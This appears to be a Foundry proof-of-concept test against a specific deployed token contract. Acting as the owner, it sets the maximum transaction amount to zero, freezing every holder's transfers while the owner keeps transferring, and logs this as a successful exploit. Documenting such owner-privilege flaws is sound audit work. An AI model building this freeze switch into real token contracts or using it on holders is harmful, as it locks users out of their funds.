// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWEB3 {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd0c4BC1B89BbD105EeCb7EBa3f13E7648c0De38F;
    address attacker = address(this);
    address ownerAddress;
    address userAddress;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a test user and give them tokens
        address user = address(0x123);
        vm.label(user, "Test User");

        // Get the contract interface
        IWEB3 token = IWEB3(TARGET);

        // Get the owner address
        address owner = token.owner();
        vm.label(owner, "Owner");

        // Give user some tokens by transferring from owner
        // First, impersonate owner to transfer tokens to user
        vm.prank(owner);
        token.transfer(user, 1000 * 10**9); // Transfer some tokens to user

        // Store references for later use
        ownerAddress = owner;
        userAddress = user;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get contract interface
        IWEB3 token = IWEB3(TARGET);

        // Step 1: Check initial _maxTxAmount
        uint256 initialMaxTx = token._maxTxAmount();
        console.log("Initial _maxTxAmount:", initialMaxTx);

        // Step 2: Impersonate owner and set maxTxPercent to 0
        vm.prank(ownerAddress);
        token.setMaxTxPercent(0);

        // Step 3: Verify _maxTxAmount is now 0
        uint256 newMaxTx = token._maxTxAmount();
        console.log("New _maxTxAmount:", newMaxTx);
        assertEq(newMaxTx, 0, "_maxTxAmount should be 0");

        // Step 4: Try to transfer from user (should fail)
        vm.prank(userAddress);
        vm.expectRevert("Transfer amount exceeds the maxTxAmount.");
        token.transfer(address(0x456), 1 * 10**9);

        // Step 5: Show owner can still transfer (bypasses the check)
        vm.prank(ownerAddress);
        token.transfer(address(0x789), 100 * 10**9);

        console.log("Exploit successful: Users locked, owner can still transfer");
        assertEq(token._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
